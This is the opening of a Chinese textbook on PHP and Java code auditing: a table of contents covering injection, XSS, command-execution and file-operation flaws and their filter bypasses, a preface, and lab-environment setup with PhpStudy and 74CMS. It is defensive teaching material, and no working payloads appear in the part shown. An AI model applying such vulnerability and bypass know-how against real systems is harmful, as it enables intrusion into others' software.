目录

[前言... 11](#_Toc78147275)

[单元1 代码审计基础... 12](#_Toc78147276)

[1.1 代码审计简介... 12](#_Toc78147277)

[1.1.1 代码审计定义... 12](#_Toc78147278)

[1.1.2 代码审计流程... 13](#_Toc78147279)

[1.1.3 代码审计分类... 14](#_Toc78147280)

[1.2 代码审计环境搭建... 14](#_Toc78147281)

[1.2.1 PhpStudy环境介绍... 14](#_Toc78147282)

[1.2.2 实验：Windows与Linux搭建74CMS. 16](#_Toc78147283)

[1.3 代码审计工具概要... 18](#_Toc78147284)

[1.4 代码编辑工具... 19](#_Toc78147285)

[1.5 自动代码审计工具... 21](#_Toc78147286)

[1.5.1 Seay代码审计工具... 21](#_Toc78147287)

[1.5.2 RIPS代码审计工具... 23](#_Toc78147288)

[1.5.3 VCG代码审计工具... 24](#_Toc78147289)

[1.5.4 Fortify SCA代码审计工具... 25](#_Toc78147290)

[1.5.5 自动化审计工具部署... 25](#_Toc78147291)

[1.6 代码审计辅助工具... 27](#_Toc78147292)

[1.6.1 数据包分析工具... 27](#_Toc78147293)

[1.6.2 浏览器辅助插件工具... 28](#_Toc78147294)

[1.6.3 实验：BurpSuite数据包拦截... 29](#_Toc78147295)

[1.6.4 编解码工具... 32](#_Toc78147296)

[1.6.5    正则表达式测试工具... 33](#_Toc78147297)

[1.6.6 数据库执行监控... 33](#_Toc78147298)

[1.7 代码审计动态调试环境搭建... 36](#_Toc78147299)

[1.7.1 动态调试原理... 36](#_Toc78147300)

[1.7.2 Xdebug安装与配置... 36](#_Toc78147301)

[1.7.3 浏览器Xdebug helper安装... 38](#_Toc78147302)

[1.7.4 PhpStorm配置远程调试... 38](#_Toc78147303)

[1.8 单元小结... 41](#_Toc78147304)

[单元2 代码审计前导... 42](#_Toc78147305)

[2.1 影响代码审计的配置... 42](#_Toc78147306)

[2.1.1 PHP的配置文件... 43](#_Toc78147307)

[2.1.2 传递变量相关的PHP配置... 43](#_Toc78147308)

[2.1.3 安全模式... 44](#_Toc78147309)

[2.1.4 文件上传及目录权限相关配置... 45](#_Toc78147310)

[2.1.5 魔术引号及远程文件相关配置... 45](#_Toc78147311)

[2.1.6 错误信息相关配置... 47](#_Toc78147312)

[2.2 代码审计基本函数... 48](#_Toc78147313)

[2.2.1 代码调试函数... 48](#_Toc78147314)

[2.2.2 可能存在漏洞的点... 49](#_Toc78147315)

[2.3 弱类型的安全... 49](#_Toc78147316)

[2.4 常见危险函数... 53](#_Toc78147317)

[2.3.1 代码执行函数... 53](#_Toc78147318)

[2.3.2 包含函数... 54](#_Toc78147319)

[2.3.3 命令执行函数... 54](#_Toc78147320)

[2.3.4 文件操作函数... 54](#_Toc78147321)

[2.3.5 变量覆盖函数... 55](#_Toc78147322)

[2.3.6 特殊函数... 55](#_Toc78147323)

[2.4 代码审计思路... 56](#_Toc78147324)

[2.4.1 敏感函数参数回溯法... 57](#_Toc78147325)

[2.4.2 实验：敏感函数参数回溯法分析74CMS案例... 57](#_Toc78147326)

[2.4.3 定向功能分析法... 59](#_Toc78147327)

[2.4.4 实验：定向功能法分析YXCMS图片上传功能... 60](#_Toc78147328)

[2.4.5 通读全文法... 62](#_Toc78147329)

[2.4.6 实验：通读全文法分析74CMS案例... 63](#_Toc78147330)

[2.5 单元小结... 66](#_Toc78147331)

[单元3 SQL注入漏洞审计... 67](#_Toc78147332)

[3.1 SQL注入漏洞挖掘... 67](#_Toc78147333)

[3.1.1 SQL注入漏洞简介... 67](#_Toc78147334)

[3.1.2 SQL注入漏洞分类概述... 67](#_Toc78147335)

[3.1.3 SQL注入漏洞挖掘经验... 68](#_Toc78147336)

[3.2 SQL注入分类... 69](#_Toc78147337)

[3.2.1  无过滤参数注入... 69](#_Toc78147338)

[3.2.2  无过滤HTTP头注入... 70](#_Toc78147339)

[3.2.3  字符串替换绕过注入... 71](#_Toc78147340)

[3.3 SQL注入绕过addslashes. 73](#_Toc78147341)

[3.3.1  宽字节注入绕过... 73](#_Toc78147342)

[3.3.2  解码注入绕过... 74](#_Toc78147343)

[3.3.3  字符串替换绕过... 76](#_Toc78147344)

[3.4 SQL注入防御... 77](#_Toc78147345)

[3.5 SQL注入CMS实践... 79](#_Toc78147346)

[3.5.1  实验：BlueCMS1.6 Union注入... 79](#_Toc78147347)

[3.5.2  实验：74CMS3.0 宽字节注入... 82](#_Toc78147348)

[3.6 单元小结... 86](#_Toc78147349)

[单元4 XSS漏洞审计... 87](#_Toc78147350)

[4.1 XSS漏洞挖掘... 87](#_Toc78147351)

[4.1.1 XSS漏洞简介... 87](#_Toc78147352)

[4.1.2 XSS漏洞挖掘经验... 88](#_Toc78147353)

[4.2 XSS漏洞分类... 88](#_Toc78147354)

[4.2.1 反射型XSS漏洞... 89](#_Toc78147355)

[4.2.3 存储型XSS漏洞... 89](#_Toc78147356)

[4.2.5 DOM型XSS漏洞... 90](#_Toc78147357)

[4.3 XSS漏洞绕过... 92](#_Toc78147358)

[4.3.1 编解码绕过... 92](#_Toc78147359)

[4.3.2 HTML编写不规范绕过... 93](#_Toc78147360)

[4.3.3 黑名单过滤绕过... 94](#_Toc78147361)

[4.3.4 宽字节注入XSS. 96](#_Toc78147362)

[4.4 XSS漏洞防御... 97](#_Toc78147363)

[4.5 XSS审计CMS实践... 98](#_Toc78147364)

[4.5.1  实验：BlueCMS1.6 反射XSS审计... 98](#_Toc78147365)

[4.5.2  实验：BlueCMS1.6 存储XSS审计... 100](#_Toc78147366)

[4.5.3  实验：74CMS3.4宽字节注入反射XSS审计... 103](#_Toc78147367)

[4.5.4  实验：74CMS3.0存储XSS审计... 106](#_Toc78147368)

[4.6 单元小结... 109](#_Toc78147369)

[单元5 CSRF漏洞审计... 110](#_Toc78147370)

[5.1 CSRF漏洞挖掘... 110](#_Toc78147371)

[5.1.1 CSRF漏洞简介... 110](#_Toc78147372)

[5.1.2 CSRF漏洞挖掘经验... 110](#_Toc78147373)

[5.2 CSRF漏洞分类... 111](#_Toc78147374)

[5.2.1 GET型CSRF漏洞... 111](#_Toc78147375)

[5.2.2 POST型CSRF漏洞... 112](#_Toc78147376)

[5.3 CSRF漏洞防御... 113](#_Toc78147377)

[5.3.1 验证HTTP Referer字段... 113](#_Toc78147378)

[5.3.2 验证Token. 114](#_Toc78147379)

[5.3.3 验证码验证... 115](#_Toc78147380)

[5.4 CSRF审计CMS实践... 115](#_Toc78147381)

[5.4.1  实验：74CMS3.0 CSRF审计... 115](#_Toc78147382)

[5.4.2  实验：YzmCMS5.8 CSRF审计... 118](#_Toc78147383)

[5.5 单元小结... 122](#_Toc78147384)

[单元6 代码执行与命令执行漏洞审计... 123](#_Toc78147385)

[6.1 代码执行漏洞挖掘... 123](#_Toc78147386)

[6.1.1 代码执行漏洞简介... 123](#_Toc78147387)

[6.1.2 代码执行漏洞常见函数... 124](#_Toc78147388)

[6.1.3 代码执行漏洞审计经验... 127](#_Toc78147389)

[6.1.4 代码执行漏洞防御... 128](#_Toc78147390)

[6.2 代码执行漏洞审计实践... 128](#_Toc78147391)

[6.2.1 YCCMS3.3代码执行漏洞审计... 128](#_Toc78147392)

[6.2.2 YzmCMS3.6代码执行漏洞审计... 131](#_Toc78147393)

[6.3 命令执行漏洞挖掘... 134](#_Toc78147394)

[6.3.1 命令执行漏洞简介... 134](#_Toc78147395)

[6.3.2 命令执行漏洞常见函数... 135](#_Toc78147396)

[6.3.3 命令执行漏洞连接符... 138](#_Toc78147397)

[6.3.4 命令执行漏洞审计经验... 139](#_Toc78147398)

[6.3.5 命令执行漏洞防御... 139](#_Toc78147399)

[6.4 命令执行审计CMS实践... 140](#_Toc78147400)

[6.4.1  实验：Discuz1.5命令执行审计... 140](#_Toc78147401)

[6.5 单元小结... 143](#_Toc78147402)

[单元7 文件包含漏洞审计... 144](#_Toc78147403)

[7.1 文件包含漏洞挖掘... 144](#_Toc78147404)

[7.1.1 文件包含漏洞简介... 144](#_Toc78147405)

[7.1.2 文件包含漏洞审计经验... 144](#_Toc78147406)

[7.1.3 文件包含漏洞防御... 145](#_Toc78147407)

[7.2 文件包含漏洞案例... 145](#_Toc78147408)

[7.3 文件包含漏洞绕过... 146](#_Toc78147409)

[7.3.1 扩展名过滤绕过（本地文件包含）... 146](#_Toc78147410)

[7.3.2 扩展名过滤绕过（远程文件包含）... 147](#_Toc78147411)

[7.4 文件包含漏洞审计CMS实践... 148](#_Toc78147412)

[7.4.1  实验：phpmyadmin4.8.1文件包含审计... 148](#_Toc78147413)

[7.4.2  实验：织梦cmsV5.7包含Cache审计... 150](#_Toc78147414)

[7.5 单元小结... 152](#_Toc78147415)

[单元8 任意文件操作漏洞审计... 153](#_Toc78147416)

[8.1 文件上传漏洞挖掘与实践... 154](#_Toc78147417)

[8.1.1 文件上传漏洞简介... 154](#_Toc78147418)

[8.1.2 文件上传漏洞挖掘经验... 154](#_Toc78147419)

[8.1.3 文件上传漏洞绕过... 154](#_Toc78147420)

[8.1.4 实验：FineCMS文件上传漏洞审计... 159](#_Toc78147421)

[8.2 文件写入漏洞挖掘与实践... 161](#_Toc78147422)

[8.2.1 文件写入漏洞简介... 161](#_Toc78147423)

[8.2.2 文件写入漏洞挖掘经验... 162](#_Toc78147424)

[8.2.3 实验：74CMS3.0文件写入漏洞审计... 162](#_Toc78147425)

[8.3 文件读取（下载）漏洞挖掘与实践... 165](#_Toc78147426)

[8.3.1 文件读取漏洞简介... 165](#_Toc78147427)

[8.3.2 文件下载漏洞简介... 166](#_Toc78147428)

[8.3.3 文件读取（下载）漏洞挖掘经验... 167](#_Toc78147429)

[8.3.4 实验：MetInfo6.0.0文件读取漏洞审计... 167](#_Toc78147430)

[8.4 文件删除漏洞挖掘与实践... 170](#_Toc78147431)

[8.4.1 文件删除漏洞简介... 170](#_Toc78147432)

[8.4.2 文件删除漏洞挖掘经验... 171](#_Toc78147433)

[8.4.3 实验：74CMS3.0文件删除漏洞审计... 171](#_Toc78147434)

[8.5 文件操作漏洞防御... 173](#_Toc78147435)

[8.6 单元小结... 174](#_Toc78147436)

[单元9 XXE与SSRF漏洞审计... 175](#_Toc78147437)

[9.1 XXE漏洞挖掘... 175](#_Toc78147438)

[9.1.1 XXE漏洞简介... 175](#_Toc78147439)

[9.1.2 XXE漏洞挖掘... 175](#_Toc78147440)

[9.2 XXE漏洞分类... 176](#_Toc78147441)

[9.3 XXE漏洞防御... 177](#_Toc78147442)

[9.4 XXE审计CMS实践... 178](#_Toc78147443)

[9.4.1  实验：CLTPHP5.5.3 XXE审计... 178](#_Toc78147444)

[9.5 SSRF漏洞挖掘... 181](#_Toc78147445)

[9.5.1 SSRF漏洞简介... 181](#_Toc78147446)

[9.5.2 SSRF漏洞挖掘经验... 181](#_Toc78147447)

[9.6 SSRF漏洞分类... 182](#_Toc78147448)

[9.6.1 CURL引起的SSRF. 182](#_Toc78147449)

[9.6.2 file_get_contents引起的SSRF. 183](#_Toc78147450)

[9.6.3 fsocketopen造成的SSRF. 183](#_Toc78147451)

[9.7 SSRF漏洞绕过... 184](#_Toc78147452)

[9.8 SSRF漏洞防御... 184](#_Toc78147453)

[9.9 SSRF审计CMS实践... 185](#_Toc78147454)

[9.9.1  实验：APPCMS2.0 SSRF审计... 185](#_Toc78147455)

[9.10 单元小结... 187](#_Toc78147456)

[单元10 变量覆盖与反序列化漏洞审计... 188](#_Toc78147457)

[10.1 变量覆盖漏洞挖掘... 188](#_Toc78147458)

[10.1.1 变量覆盖漏洞简介... 188](#_Toc78147459)

[10.1.2 变量覆盖漏洞审计经验... 189](#_Toc78147460)

[10.1.3 变量覆盖漏洞防御... 189](#_Toc78147461)

[10.2 变量覆盖漏洞案例... 189](#_Toc78147462)

[10.2.1 extract函数使用不当... 190](#_Toc78147463)

[10.2.2 parse_str函数使用不当... 190](#_Toc78147464)

[10.2.3 import_request_variables函数使用不当... 191](#_Toc78147465)

[10.2.4 全局变量覆盖... 192](#_Toc78147466)

[10.2.5 $$变量覆盖... 193](#_Toc78147467)

[10.3 变量覆盖审计CMS实践... 193](#_Toc78147468)

[10.3.1  实验：PHPCMS2008变量覆盖审计... 193](#_Toc78147469)

[10.4 反序列化漏洞... 196](#_Toc78147470)

[10.4.1 序列化介绍... 197](#_Toc78147471)

[10.4.2 反序列化漏洞介绍... 198](#_Toc78147472)

[10.5 反序列化漏洞CMS实践... 200](#_Toc78147473)

[10.5.1  实验：Typecho1.0.14反序列化审计... 200](#_Toc78147474)

[10.6 单元小结... 205](#_Toc78147475)

[单元11 业务功能审计... 206](#_Toc78147476)

[11.1 验证码功能漏洞... 206](#_Toc78147477)

[11.1.1 验证码功能介绍... 206](#_Toc78147478)

[11.1.2 验证码功能常见安全问题... 207](#_Toc78147479)

[11.1.3   验证码绕过方式... 207](#_Toc78147480)

[11.1.4 实验：验证码功能漏洞导致任意用户注册实践... 210](#_Toc78147481)

[11.2 密码重置功能漏洞... 213](#_Toc78147482)

[11.2.1 密码重置功能介绍... 213](#_Toc78147483)

[11.2.2 密码重置功能的常见案例... 213](#_Toc78147484)

[11.2.3 密码重置功能防御方法... 218](#_Toc78147485)

[11.2.4   实验：任意用户密码重置实践... 218](#_Toc78147486)

[11.3 交易支付功能漏洞... 222](#_Toc78147487)

[11.3.1 交易支付功能漏洞介绍... 222](#_Toc78147488)

[11.3.2 交易支付功能漏洞挖掘... 222](#_Toc78147489)

[11.3.3 交易支付功能常见安全问题... 223](#_Toc78147490)

[11.3.4 交易支付功能防御方法... 225](#_Toc78147491)

[11.4 单元小结... 225](#_Toc78147492)

[单元12 YXCMS审计... 226](#_Toc78147493)

[12.1 审计前准备... 226](#_Toc78147494)

[12.2 留言板存储型XSS分析... 230](#_Toc78147495)

[12.3 碎片管理SQL注入分析... 231](#_Toc78147496)

[12.4 任意文件操作漏洞分析... 233](#_Toc78147497)

[12.4.1 YMCMS任意文件删除... 233](#_Toc78147498)

[12.4.2 YMCMS任意文件写入... 234](#_Toc78147499)

[12.5 单元小结... 235](#_Toc78147500)

[单元13 Java代码审计... 236](#_Toc78147501)

[13.1 Java代码审计入门... 236](#_Toc78147502)

[13.1.1 Java EE介绍... 236](#_Toc78147503)

[13.1.2 Java代码审计基础... 238](#_Toc78147504)

[13.2 Java代码中的SQL注入漏洞... 241](#_Toc78147505)

[13.2.1 JDBC的SQL注入... 241](#_Toc78147506)

[13.2.2 Mybatis的SQL注入... 242](#_Toc78147507)

[13.2.3   Java的SQL注入漏洞防御... 245](#_Toc78147508)

[13.2.4   OFCMS平台SQL注入漏洞分析... 246](#_Toc78147509)

[13.3 Java代码中的XSS漏洞... 248](#_Toc78147510)

[13.3.1 Java中的XSS漏洞... 248](#_Toc78147511)

[13.3.2   Java中XSS漏洞防御... 251](#_Toc78147512)

[13.3.3   JEESNS平台XSS漏洞分析... 253](#_Toc78147513)

[13.4       Java代码中的命令执行漏洞... 255](#_Toc78147514)

[13.4.1 Java中的命令执行漏洞... 255](#_Toc78147515)

[13.4.2 Java中命令执行漏洞防御... 257](#_Toc78147516)

[13.5 Java代码中的文件操作漏洞... 257](#_Toc78147517)

[13.5.1 Java中的文件上传漏洞... 257](#_Toc78147518)

[13.5.2 Java中的文件读取漏洞... 260](#_Toc78147519)

[13.5.3 Java中的文件删除漏洞... 262](#_Toc78147520)

[13.5.4 MCMS平台文件上传漏洞分析... 262](#_Toc78147521)

[13.6 Java代码中的SSRF漏洞... 263](#_Toc78147522)

[13.6.1 Java中的SSRF漏洞... 263](#_Toc78147523)

[13.6.2 Java中的SSRF漏洞防御... 265](#_Toc78147524)

[13.6.3 Hawtio平台SSRF漏洞分析... 265](#_Toc78147525)

[13.7 单元小结... 268](#_Toc78147526)

[单元14 Python框架安全... 269](#_Toc78147527)

[14.1 Django框架介绍... 269](#_Toc78147528)

[14.1.1 Django框架简介... 269](#_Toc78147529)

[14.1.2 实验：Django搭建... 272](#_Toc78147530)

[14.2 Django框架常见漏洞... 274](#_Toc78147531)

[14.2.1 Django中的XSS漏洞... 274](#_Toc78147532)

[14.2.2 Django的XSS案例... 276](#_Toc78147533)

[14.2.3 Django中的CSRF漏洞... 279](#_Toc78147534)

[14.2.4 Django中的SQL注入漏洞... 280](#_Toc78147535)

[14.2.5 Django中的格式化字符串漏洞... 280](#_Toc78147536)

[14.2.6 Django中的其他漏洞... 282](#_Toc78147537)

[14.3 Flask框架常见漏洞... 283](#_Toc78147538)

[14.3.1 Flask框架介绍... 283](#_Toc78147539)

[12.3.2   Flask中SSTI漏洞... 284](#_Toc78147540)

[14.4 Tornado框架常见漏洞... 286](#_Toc78147541)

[14.4.1 Tornado框架介绍... 286](#_Toc78147542)

[14.4.2 Tornado中任意文件读取漏洞... 287](#_Toc78147543)

[14.5 单元小结... 290](#_Toc78147544)

[术语表... 291](#_Toc78147545)

 



 

# 前言

代码审计是一种以发现程序错误、安全漏洞和违反程序规范为目标的源代码分析技术，是对程序编写过程中源代码的全面分析，其目的是发现错误，找到安全隐患，从而提高程序的安全性和可靠性，减少受到网络攻击的可能性。

代码审计的方法通常包括：白盒、黑盒、灰盒等方式。白盒是指通过对源代码的分析找到应用缺陷，黑盒通常不涉及到源代码，多使用模糊测试的方式，而灰盒则是黑白结合的方式。与其他信息安全技术相比，代码审计是一种主动安全防御技术，通过代码审计，可以从根本上加强系统的安全性和可靠性，对提高信息系统的安全性，减少因信息系统漏洞造成的损失有重要的意义和作用。

代码审计要求的门槛较高，通常需要审计人员对PHP代码非常熟悉且具有多年的从业经验，能够对常见框架、常见CMS、常见功能漏洞有分析经验。除此之外，可以对多种编程语言进行分析审计。因此，本书将以教学为目的对代码审计课程进行讲述，同时配以相应漏洞的CMS审计实践从而深化读者对代码审计的理解。

本书首先对代码审计的定义、代码审计的流程、代码审计的分类进行了系统的介绍，以PhpStudy为例，介绍了代码审计环境的搭建，并介绍了当前常用的代码审计工具。接下来，详细介绍了SQL注入漏洞审计、XSS漏洞审计、CSRF请求伪造漏洞审计、代码执行与命令执行漏洞审计、文件包含漏洞审计、XXE与SSRF漏洞审计、任意文件操作漏洞审计、变量覆盖与反序列化漏洞审计、业务功能审计等内容。最后介绍了对当前常用的程序设计语言JAVA和Python的代码审计案例。

本书由天津职业大学电子信息与工程学院的时瑞鹏主编，负责全书统稿，安厚霖、李国辉任副主编。在编写过程中，得到360网络安全大学平台的帮助与支持，读者可在该平台进行视频、教学PPT、实验实践学习。同时，本书注重所述内容的可操作性和实用性，以网络安全管理人员为主要读者群体，同时兼顾广大计算机网络爱好者的需求，是一本进行网络操作系统安全管理的实用教材和必备的重要参考书。限于作者的知识水平和认知能力，书中肯定存在一些不当之处，恳请读者批评指正。

 

​                               作者

​                              2021年7月



 

# 单元1 代码审计基础

本单元介绍了代码审计中需要具备的基础知识，其主要分为四个部分进行介绍。

第一部分主要介绍代码审计的基本概念，包括：代码审计的定义、代码审计的流程等。

第二部分以PhpStudy搭建骑士CMS人才系统为案例，详细介绍Windows及Linux操作系统下PHP代码审计环境搭建方法。

第三部分介绍代码审计中常用的审计工具，包括：自动审计工具、代码编辑工具、代码审计辅助工具，包括：正则表达式、数据包分析、编解码、加解密、数据库执行监控等常用工具。

第四部分介绍代码审计中PhpStorm与Xdebug动态调试环境搭建方法。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

**单元目标：**

\1. 了解代码审计概念；

\2. 掌握代码审计CMS环境搭建方法；

\3. 熟悉常用代码审计工具使用方法；

\4. 掌握代码审计动态环境搭建方法。

## 1.1 代码审计简介

代码审计既是企业安全运营及安全从业者必备的基本技能，也是一种以发现程序错误、安全漏洞和违反程序规范为目标的源代码分析技能，本小节将对代码审计进行介绍。

### 1.1.1 代码审计定义 

代码审计是防御性编程范式的一部分，其旨在检测代码中存在的安全缺陷，针对存在的缺陷提供解决方案，降低程序使用时的安全风险。通过代码审计几乎可以通过对源代码进行审计的方式发现所有代码层面的安全漏洞，包括：常见的Web安全漏洞、业务逻辑漏洞、应用程序漏洞以及应用程序配置文件中的不安全因素等。

在软件发布前进行代码审计，可将不安全因素扼杀在萌芽状态，极大缩减了后期修复所花费的成本。测试过程不会对线上业务造成影响，不会导致诸如系统宕机、服务卡死、数据库阻塞和业务数据丢失等风险。但由于代码审计需要深入理解代码逻辑和业务结构，因此对审计人员的能力素质要求较高，需要花费的精力也更多。

通常代码审计的对象可以是几乎所有的编程语言，常见的语言包括：Java、C、C#、PHP、Python和JSP等,本书将以PHP为主进行代码审计案例介绍。

代码审计作为安全领域中难度较高的一门学科，需要读者在学习本课程之前具备以下条件：

l 熟悉PHP开发语言

l 熟悉Web安全常见漏洞及利用方法

l 熟悉数据库语言

### 1.1.2 代码审计流程 

对程序代码进行白盒（代码审计）的方式检查应用程序的安全性，在代码审计初期，需要源代码审计人员审计Web应用的架构设计、功能模块，并与客户相关人员协商审计重点及代码提供等信息。然后，源代码审计人员使用工具对源代码的脆弱性和安全型进行初步分析，根据客户关注的重点对源代码进行手工审计。

一般情况下，代码审计的基本流程主要包括四个阶段如图1-1所示，其分别是：

l 代码审计阶段

l 审计实施阶段

l 审计复查阶段

l 成果汇报阶段

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

图1-1 代码审计流程图

审计人员对程序源代码使用自动化审计工具进行漏洞扫描，并对扫描结果进行人工审计确认，如图1-2所示。同时，还需对源代码的常规漏洞和业务逻辑漏洞进行审计，最终输出代码审计报告。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)

图1-2 代码审计流程图

### 1.1.3 代码审计分类 

代码审计所采用的方式主要包括：工具审计、人工确认、人工抽取代码进行检查。代码审计分类包括：自动化审计和人工审计。在审计过程中通常采用上述两种方法相结合的方式进行审计，这能够保证对应用程序代码审计的全面性。

1.自动化审计

在源代码的静态安全审计中，使用自动化审计工具代替人工漏洞挖掘，可以显著提高审计工作的效率。但是，自动化审计也存在缺点，包括：

l 漏洞误报多：很多自动化扫描出的漏洞都不准确，需要人工审计进行确认；

l 漏洞识别率低：二次注入、逻辑安全等漏洞不能被扫描工具识别。

2.人工审计

相比于自动化审计而言，人工审计更加准确，却也更加耗费时间与精力。人工审计通常要从程序的配置文件开始梳理系统，例如：application-context.xml、php.ini、web.xml等。然后分析程序的数据流，针对程序开发框架不同，其传递的流程也不尽相同。

## 1.2 代码审计环境搭建

由于很多漏洞都依赖于软件版本，例如：文件解析漏洞、中间件漏洞。因此代码审计的环境搭建需秉承以下原则：

l 环境搭建过程尽量简单易管理；

l 环境支持开发语言、数据库等依赖环境支持多种版本。

基于以上原则，本书使用PhpStudy工具进行集成环境搭建，从而简化环境搭建过程，将重点更侧重于漏洞代码审计的技能，本节将介绍代码审计环境搭建方法。

### 1.2.1 PhpStudy环境介绍

PhpStudy是一款PHP调试环境的程序集成包。使用PhpStudy搭建环境可以实现一次性安装、无须配置、方便PHP调试环境。该工具支持Windows、Linux、Mac三种操作系统，目前最新版本为PhpStudyV8。与PhpStudy集成环境类似的工具有：XAMPP、APPServer、WampServer等。本小节以PhpStudy2018为例，对该工具常用功能进行介绍。

1.服务控制

PhpStudy主界面如图1-3所示，该工具默认提供了Apache与MySQL两种服务，可通过点击界面中“启动|停止|重启”按钮控制服务状态。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)

图1-3 PhpStudy主界面

2.PhpStudy支持的软件版本

PhpStudy程序包集成了很多Web应用环境，包括：

l Web应用中间件部分包括：IIS、Apache、Nginx；

l 数据库包括：MySQL；

l PHP语言版本：php7、php6、php5等版本。

  当在PhpStudy主界面点击“切换版本” 按钮，将显示PhpStudy2018支持服务的不同版本，如图1-4所示。用户可根据不同的审计需求选择合适的版本搭配从而更方便的切换实验环境。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)

图1-4 PhpStudy支持版本

3.MySQL数据库管理

  PhpStudy中MySQL数据库默认使用的管理员密码均为“root”，用户可通过“其他选项”->“MySQL工具”->“设置或修改密码”对数据库管理员密码进行修改。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)

图1-5 修改MySQL密码图

PhpStudy还支持多种数据库管理工具，包括：MySQL-Front、phpMyAdmin。用户可通过点击上述工具连接本机数据库，图1-6给出MySQL-Front使用界面。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)

图1-6 MySQL-Front管理工具

  除上述介绍功能外，PhpStudy具有的功能还包括：站点域名管理、环境端口检测、配置文件修改、网站根目录等。

### 1.2.2 实验：Windows与Linux搭建74CMS

· 实验介绍

本次实验将在Windows及Linux系统下使用PhpStudy集成环境搭建74CMS3.6人才管理系统。值得注意：CMS网站有很多类型，例如：74CMS、BlueCMS、ZZCMS等。不同的CMS搭建方法也存在差异，本节以74CMS为案例进行搭建。

· 预备知识

参考1.2.1节：PhpStudy环境介绍。

· 实验目的

掌握使用PhpStudy搭建74CMS方法。

· 实验环境

Windows操作系统主机；Centos7操作系统主机；74CMS3.6安装包；PhpStudy2018安装包Windows与Linux版本（PHP5.0版本及以上、MySQL5.0版本及以上）。

· 实验步骤

第一部分：Windows搭建74CMS

（1）安装PhpStudy并启动Apache与MySQL。解压PhpStudy2018安装包，然后双击“PhpStudy.exe”。点击“启动”按钮开启Apache与MySQL服务，Apache服务默认开启在本机的80端口提供HTTP服务，MySQL服务默认开启在本机的3306端口听数据库服务。点击“停止”可以将两个服务关闭，如图1-7所示。注意：如果Apache或MySQL服务启动失败，很有可能是端口80或3306被占用导致的服务启动失败。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)

图1-7 PhpStudy启动停止图

（2）点击“其他选项菜单”找到“网站根目录”打开PhpStudy默认提供的网站路径，本书中路径为“C:\PhpStudy\PHPTutorial\WWW”，如图1-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)

图1-8 网站根路径图

（3）将本实验提供74CMS文件中的upload文件夹拷贝到网站根路径。在浏览器中输入“http://主机IP地址/安装目录/install”。若访问成功则显示如下界面。根据安装向导自行进行安装，在安装过程中需填写数据库用户名及密码（与PhpStudy对应）、自定义数据库名称、管理员用户名密码等。安装过程如下图1-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif)

图1-9 网站安装过程简易图

（4）向导安装后，若显示“已成功安装骑士CMS”字样则成功安装，如图1-10所示。点击“网站首页”浏览网站安装后结果，同时也可点击“网站后台”输入用户名密码登陆后台。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg)

图1-10 网站安装成功图

第二部分：Centos7搭建74CMS

（1）  在Linux操作系统下使用命令为：



yum install -y wget

wget -O install.sh https://notdocker.xp.cn/install.sh

sh install.sh



下载PhpStudy的非docker版本进行安装。安装成功后，界面显示浏览器访问地址及系统登录的账号及密码，如图1-11所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg)

图1-11 PhpStudy安装成功图

（2）在浏览器中输入“http://192.168.6.154:9080/4EC69D”并输入用户名登录进行登录，通过选项卡“首页”关闭nginx并启动apache2.4.39。点击“数据库”选项卡，安装MySQL5.7.27版本，如图1-12所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg)

图1-12 PhpStudy配置图

（3）通过上述管理界面可查看Web根路径为“[/www/admin/localhost_80/wwwroot](javascript:;)”，在该路径下使用命令“echo hello > index.php”，然后使用浏览器访问“http://主机IP/index.php”显示页面，则说明网站搭建成功，如图1-13所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg)

图1-13 index页面浏览图

## 1.3  代码审计工具概要

在代码审计过程中，为保证审计代码的完整性与准确性，我们通常需要使用自动化代码审计与人工审计相结合的方式，不同的审计方式也将使用各种各样的审计工具来提升工作效率，下面对自动审计及人工审计使用的工具进行介绍。

（1）自动代码审计工具

自动代码审计工具可快速的扫描程序中的常规漏洞，并进行验证分析。此类工具的使用在一定程度上提升了代码审计的效率。

但是自动审计工具的缺点也很明显。自动代码审计工具只能根据静态代码进行审计常规漏洞。而对于代码逻辑，业务逻辑类型的漏洞却很难发现。同时，自动审计工具的扫描结果也存在一定的误报率，而误报率过高则会一定程度上增加审计的工作量。

根据代码语言的不同往往使用的审计工具也不同，PHP、Java、Python都存在很多开源的自动代码审计工具。本单元则主要介绍PHP代码审计工具，包括：Seay、RIPS、VCG等。

（2）人工代码审计工具

人工代码审计过程中，往往会使用动态调试与审计小工具相结合的方式。很多程序在设计之初都会考虑常见安全漏洞问题，尤其对于用户传入的数据都会经过严格的过滤筛选与编码加密。针对数据流操作的不同方式，一般会将审计工具分为以下几类：

l 对数据进行编码及加密：加解密编码解码工具；

l 对数据进行正则表达式匹配：正则表达式测试工具；

人工分析利用漏洞的EXP需要的工具：

l 测试EXP：数据包抓包分析工具；

l SQL注入漏洞测试：数据库执行监控工具。

上述代码审计工具的使用可以更方便的测试程序中各种功能漏洞。

## 1.4 代码编辑工具

代码编辑工具是代码审计的必备工具，顺手的代码编辑工具可以更方便的查看代码、调试功能、查找内容等。而代码编辑工具发展至今也多种多样，在代码审计过程中选择适合的代码编辑工具往往可以达到事半功倍的效果。

一般将代码编辑工具分为两类：轻量级代码编辑工具、集成开发工具IDE。

l 轻量级代码编辑工具

